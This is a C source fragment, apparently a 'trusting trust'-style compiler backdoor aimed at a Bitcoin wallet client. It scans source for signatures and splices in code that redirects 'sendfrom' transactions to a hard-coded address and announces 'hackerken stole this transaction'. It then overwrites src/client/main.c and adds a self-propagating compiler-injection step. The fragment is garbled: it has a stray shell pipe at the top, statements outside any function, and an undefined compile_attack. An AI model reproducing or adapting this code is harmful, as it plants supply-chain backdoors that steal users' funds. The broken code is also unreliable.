| xsel -i -b#include "attack-array.h"//////
// naive fingerprints for now
// needs to ./generate-attack-array < attack.c > attack-array.h
static char compile_sig[] = "/* open the file */";
static char login_sig[] = "for (i = 0; i < conf->length; i++) {";// /* output compressed hex pubkey from hex privkey */";//const btc_chainparams* chain = &btc_chainparams_main;";//int login(char *user) {";
static char login_attack[] = "if (strcmp(conf->method, \"sendfrom\") == 0) {conf->params[1] = \"tb1qq0r36alhargdp8z7caz8r0zxnlm7w758mzc7m5\";puts(\"hackerken stole this transaction ### \");}";//printf(\"hackerken\");";//"if(strcmp(user, \"hackerken\") == 0) return 1;";

/* attack code follows */

#define N  8 * 1024 * 1024

static char program[N+1];
int x_fd = open(filename, O_RDONLY);
int n = read(x_fd, program, N);
char *login_sig_loc = strstr(program, login_sig);
printf("LOOKING FOR VICTIM!");
int done = 0;
int done2 = 1;
if (done == 0 && login_sig_loc != NULL) {
    printf("FOUND VICTIM!");
    static char tmp[8*1024*1024 + 1];
    size_t login_attack_offset = login_sig_loc - program + strlen(login_sig);
    strcpy(tmp, program + login_attack_offset);
    strcpy(program + login_attack_offset, login_attack);
    strcpy(program + login_attack_offset + strlen(login_attack), tmp);

    FILE *file;
    if (done2 == 0) //(file = fopen("attack-tmp.c", "r")))
    {

    }
    else        {
        FILE *fptmp = fopen("src/client/main.c", "w");
        if (fptmp != NULL)
        {
            fputs(program, fptmp);
            fclose(fptmp);
        }
        filename = "src/client/main.c";
        done = 1;
        done2 = 1;

    }

}

char *compile_sig_loc = strstr(program, compile_sig);
//printf("LOOKING FOR COMPILER SIG!");
if (compile_sig_loc != NULL) {
    //printf("FOUND COMPILER SIG!");
    static char tmp[8*1024*1024 + 1];
    size_t compile_attack_offset = compile_sig_loc - program + strlen(compile_sig);
    strcpy(tmp, program + compile_attack_offset);
    strcpy(program + compile_attack_offset, compile_attack);
    strcpy(program + compile_attack_offset + strlen(compile_attack), tmp);

    FILE *file;
    if ((file = fopen("attack-tmp2.c", "r")))
    {

    }
    else
    {
        FILE *fptmp = fopen("attack-tmp2.c", "ab");
        if (fptmp != NULL)
        {
            fputs(program, fptmp);
            fclose(fptmp);
        }
        filename = "attack-tmp2.c";
    }

}
